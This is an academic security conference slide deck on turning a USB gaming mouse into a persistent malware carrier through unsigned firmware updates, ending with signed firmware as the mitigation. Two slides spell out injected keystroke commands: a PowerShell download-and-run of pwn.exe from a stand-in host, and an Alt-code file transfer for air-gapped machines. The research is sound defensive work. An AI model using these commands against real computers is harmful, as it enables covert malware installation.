<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>Mouse Trap Exploiting Firmware Updates in USB Peripherals Presented by Jacob Maskiewicz, 8.19.2014</p>
    <p>With Benjamin Ellis, James Mouradian, and Hovav Shacham</p>
    <p>UC San Diego</p>
  </div>
  <div class="page">
    <p>Motivation</p>
    <p>December 2011: EDA thought they were under cyber attack</p>
  </div>
  <div class="page">
    <p>Motivation</p>
    <p>December 2011: EDA thought they were under cyber attack</p>
  </div>
  <div class="page">
    <p>Motivation</p>
    <p>December 2011: EDA thought they were under cyber attack</p>
  </div>
  <div class="page">
    <p>Motivation</p>
    <p>December 2011: EDA thought they were under cyber attack</p>
  </div>
  <div class="page">
    <p>Motivation</p>
    <p>December 2011: EDA thought they were under cyber attack</p>
  </div>
  <div class="page">
    <p>Oops</p>
  </div>
  <div class="page">
    <p>It was all just a miscommunication http://www.oig.doc.gov/OIGPublications/OIG-13-027-A.pdf</p>
  </div>
  <div class="page">
    <p>Indeed, throwing away computer mice seems like a poor approach to ridding an organization of digital threats.</p>
    <p>http://www.theverge.com/2013/7/8/4503946/commerce-department-unnecessary-cybersecurity-computer-destruction http://arstechnica.com/information-technology/2013/07/us-agency-baffled-by-modern-technology-destroys-mice-to-get-ridof-viruses/</p>
  </div>
  <div class="page">
    <p>Research Question</p>
    <p>Can we infect a mouse with malware?</p>
  </div>
  <div class="page">
    <p>High Level Goals 1. Compromise a mouse via a firmware update attack</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
    <p>Infect Exploit</p>
    <p>Networked</p>
    <p>Air-Gapped</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
    <p>Infect Exploit</p>
    <p>Networked</p>
    <p>Air-Gapped</p>
  </div>
  <div class="page">
    <p>firmware updates over USB  USB is not a privileged resource</p>
    <p>Infecting Mice on Networked Targets</p>
    <p>Logitech Updater</p>
    <p>Drive-by-Download Man in the MiddleTrojan Horse</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
    <p>Infect Exploit</p>
    <p>Networked</p>
    <p>Air-Gapped</p>
  </div>
  <div class="page">
    <p>Handling the air gap Security firm Netragard succeeded after mailing a target a promotional mouse [8]</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
    <p>Infect Exploit</p>
    <p>Networked</p>
    <p>Air-Gapped</p>
  </div>
  <div class="page">
    <p>Simply download malware from the internet</p>
    <p>Get Malware</p>
    <p>Exploiting Networked Hosts</p>
  </div>
  <div class="page">
    <p>Simply download malware from the internet</p>
    <p>What did we gain?</p>
    <p>Exploiting Networked Hosts</p>
  </div>
  <div class="page">
    <p>Suppose the user cleans the computer</p>
    <p>Exploiting Networked Hosts</p>
  </div>
  <div class="page">
    <p>Just download the malware again</p>
    <p>Get New Malware</p>
    <p>Exploiting Networked Hosts</p>
  </div>
  <div class="page">
    <p>Just download the malware again</p>
    <p>Persistent Threat</p>
    <p>Exploiting Networked Hosts</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
    <p>Infect Exploit</p>
    <p>Networked</p>
    <p>Air-Gapped</p>
  </div>
  <div class="page">
    <p>Infecting Air-gapped Hosts Simply download malware from the internet?</p>
    <p>x</p>
  </div>
  <div class="page">
    <p>Infecting Air-gapped Hosts Simply download malware from the internet?</p>
    <p>No. The mouse must store and transfer the malware.</p>
    <p>x</p>
  </div>
  <div class="page">
    <p>Attack Model</p>
    <p>Infect Exploit</p>
    <p>Networked</p>
    <p>Air-Gapped</p>
  </div>
  <div class="page">
    <p>Overview of the Mouse</p>
  </div>
  <div class="page">
    <p>Choosing a mouse We needed a mouse with a firmware updater</p>
    <p>So we chose the Logitech G600</p>
  </div>
  <div class="page">
    <p>Processor: ATmega32U2 Architecture: AVR (8 bit RISC ISA)</p>
  </div>
  <div class="page">
    <p>The Mouses Architecture  Two segments: application &amp; bootloader  Application segment: normal operation  Bootloader segment: firmware updates</p>
    <p>extra privileges</p>
  </div>
  <div class="page">
    <p>Taking a closer look Since the Logitech G600 is a gaming mouse it has buttons G9-G20</p>
  </div>
  <div class="page">
    <p>Listening to a button press</p>
    <p>HID 1</p>
    <p>G9 pressed (bit flag)</p>
    <p>HID key up</p>
    <p>G9 cleared</p>
    <p>These 4 USB packets send HID 1</p>
  </div>
  <div class="page">
    <p>Reverse Engineering</p>
  </div>
  <div class="page">
    <p>Start by reading the manual</p>
  </div>
  <div class="page">
    <p>Fast forward Annotated over 160 functions (over 4,000 lines of assembly)</p>
    <p>Identified many libraries</p>
    <p>; function send_hid</p>
    <p>; if (r16[5] == 0) sbrc r16, 5 rjmp .+16 ; START IF BODY ...</p>
  </div>
  <div class="page">
    <p>Updating the Firmware</p>
    <p>firmware &amp; prepare it as an IHEX file</p>
    <p>&gt; make malware</p>
    <p>mov r17, r16 add r17, r17 sbc r17, r17</p>
  </div>
  <div class="page">
    <p>The Attack What can a malicious mouse actually do?</p>
  </div>
  <div class="page">
    <p>A Lot</p>
  </div>
  <div class="page">
    <p>Lets write some malware &lt;WIN&gt; + R</p>
    <p>powershell.exe</p>
    <p>Start-BitsTransfer</p>
    <p>-source http://pwn.com/pwn.exe</p>
    <p>-destination .\pwn.exe</p>
    <p>.\pwn.exe</p>
    <p>exit</p>
    <p>The networked target is the easy case</p>
  </div>
  <div class="page">
    <p>&lt;WIN&gt; + R</p>
    <p>cmd.exe</p>
    <p>copy con pwn.exe</p>
    <p>&lt;Alt key combos&gt;</p>
    <p>exit</p>
    <p>Lets transfer some files</p>
    <p>{ Want to transfer arbitrary bytes?</p>
    <p>Alt + 2 + 5 + 0</p>
    <p>Mouse has &gt; 6 KB available for storing malware</p>
  </div>
  <div class="page">
    <p>There is a 16 bit counter available for triggering</p>
  </div>
  <div class="page">
    <p>Mitigations</p>
  </div>
  <div class="page">
    <p>Sign the firmware 1101 1001 0101 0111 1010 1100 1001 0001 1001 1110 0010 1001 0011 0100 0001 1101 1101 1001 0101 0111 1010 1100 1001 0001 1001 1110 0010 1001 0011 0100 0001 1101 1101 1001 0101 0111 1010 1100 1001 0001 1001 1110 0010 1001</p>
  </div>
  <div class="page">
    <p>Sign the firmware Implemented RSA signature verification (PKCS #1.5), using Spongent/256/256/128 as our underlying hash function [2,3,6]</p>
    <p>Current Bootloader Size: Max Bootloader Size:</p>
    <p>Signature Verification Code:</p>
    <p>This is reasonable</p>
  </div>
  <div class="page">
    <p>Conclusion</p>
  </div>
  <div class="page">
    <p>Conclusion We demonstrated an end-to-end evaluation of using mice as a persistent malware delivery mechanism.</p>
    <p>Demonstrated that RSA signatures are a feasible mitigation.</p>
    <p>We believe that all firmware updates should be signed and that all embedded device should verify update signatures.</p>
  </div>
  <div class="page">
    <p>Not limited to mice</p>
    <p>http://d3nevzfk7ii3be.cloudfront.net/igi/jUFDvEgjpksEQrDP http://ecx.images-amazon.com/images/I/41C-RYKSoAL._SY300_.jpg http://ssl-product-images.www8-hp.com/digmedialib/prodimg/lowres/c02931619. png</p>
    <p>When Firmware Modifications Attack, Cui et al.</p>
    <p>Reverse Engineering and Exploiting a Firmware Update, K. Chen</p>
    <p>iSeeYou, Brocker and Checkoway</p>
  </div>
  <div class="page">
    <p>Acknowledgments Project partners Ben Ellis &amp; James Mouradian</p>
    <p>My advisor Hovav Shacham</p>
    <p>K. Mowery &amp; D. Kohlbrenner for IDA assistance</p>
    <p>Samuel Chen for JTAG assistance</p>
    <p>Michael Walter for translating related work</p>
  </div>
  <div class="page">
    <p>Are there any questions?</p>
    <p>Thanks for listening</p>
  </div>
  <div class="page">
    <p>References 1. Atmel. Dolc 799: AtMega8U2/16U2/32U2 Complete. http://www.atmel.com/images/doc7799.pdf, September 2012. [Online; accessed 2014-03-12]</p>
  </div>
  <div class="page">
    <p>References Continued 7. Adam Kujawa. You Dirty RAT! Part 1-- DarkComet. http://blog.malwarebytes.org/intelligence/2012/06/you-dirty-rat-part-1darkcomet/, June 2012. [Online; accessed 2014-05-22].</p>
    <p>All clipart from https://openclipart.org</p>
  </div>
  <div class="page">
    <p>Other nuances  Mouses are used between computers</p>
    <p>across generations  shared among computers (Synergy, etc)</p>
  </div>
  <div class="page">
    <p>Constants reveal USB calls We started by looking for functions that dealt with the button press header/footer (0x80, 0x14)</p>
    <p>Make constants human readable to find USB</p>
  </div>
  <div class="page">
    <p>The entire process 1. write custom assembly 2. run a script to modify the firmware &amp; prepare</p>
    <p>it as an IHEX file a. assemble the custom assembly with avr-gcc b. copy the bytes from the compiled binary to an</p>
    <p>unused portion of the original firmware c. compute a CRC of the modified firmware d. use avr-objcopy to convert the elf to an IHEX file</p>
    <p>updater</p>
  </div>
</Presentation>
